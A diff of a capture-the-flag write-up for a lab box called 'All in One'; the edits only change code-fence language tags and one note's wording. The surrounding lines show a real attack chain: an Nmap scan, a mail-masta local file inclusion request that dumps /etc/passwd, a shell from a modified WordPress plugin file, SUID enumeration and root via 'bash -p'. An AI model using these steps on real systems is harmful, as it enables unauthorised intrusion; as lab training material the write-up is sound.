@@ -21,7 +21,7 @@ This "All in One" Box has various vulnerabilities that can be exploited in sever
 
 
 * Nmap Report:
-  ```sh linenums="1" hl_lines="6 21 26"
+  ```s linenums="1" hl_lines="6 21 26"
     # Nmap 7.93 scan initiated Mon Feb 13 09:48:37 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.245.161
     Nmap scan report for 10.10.245.161
     Host is up (0.16s latency).
@@ -113,7 +113,7 @@ To retrieve **`/etc/passwd`**, I used:
 GET /wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd HTTP/1.1
 ```
 
-```sh linenums="1" hl_lines="24"
+```s linenums="1" hl_lines="24"
 root:x:0:0:root:/root:/bin/bash 
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
 bin:x:2:2:bin:/bin:/usr/sbin/nologin 
@@ -189,7 +189,7 @@ Although I attempted to reuse the SQL password for the SSH service, it didn't wo
 <img id="image5" />
 
 !!! abstract "Note"
-    <span>Note: You need to deactivate the reflex-gallery plugin first to change the PHP file, then activate it again.</span>
+    <span>You need to deactivate the reflex-gallery plugin first to change the PHP file, then activate it again.</span>
 
 When **`/wordpress/wp-content/plugins/reflex-gallery/lib/gallery-class.php`** was accessed on browser, I obtained a shell with the `www-data` user.
 
@@ -211,7 +211,7 @@ When **`/wordpress/wp-content/plugins/reflex-gallery/lib/gallery-class.php`** wa
         
         <span>I searched for files owned by elyana using the command and found a **private.txt** file in the **/etc/** folder.</span>
         
-        ```dtd 
+        ```s 
         find / -user elyana 2>/dev/null 
         ```
         
@@ -221,13 +221,13 @@ When **`/wordpress/wp-content/plugins/reflex-gallery/lib/gallery-class.php`** wa
 
         <span>Then, I checked all SUID set bit binaries to see what I could exploit, and ran the command:</span>
 
-        ```dtd
+        ```s
         find / -user root -perm /4000 -ls 2>/dev/null
         ```
 
         <span>This showed me that the following binaries were available in SUID set:</span>
 
-        ```dtd
+        ```s
         -rwsr-sr-x 1 root root 1.1M Jun 6 2019 /bin/bash
         -rwsr-sr-x 1 root root 59K Jan 18 2018 /bin/chmod
         -rwsr-sr-x 1 root root 392K Apr 4 2018 /usr/bin/socat
@@ -256,7 +256,7 @@ You can escalate your privilege to root in different ways:
         
         <span>So, I changed the code to:</span>
         
-        ```dtd
+        ```s
         cp /root/root.txt /tmp/root.txt. 
         ```        
 
@@ -264,7 +264,7 @@ You can escalate your privilege to root in different ways:
 
         <span>We already knew about the SUID binaries, including **/bin/bash**, **/bin/chmod**, and **/usr/bin/socat**. I decided to check with the bash binary by running the following command:</span>
 
-        ```dtd 
+        ```s 
         /bin/bash -p
         ```
         <span>This command allowed me to get root access. What else can I ask? </span>
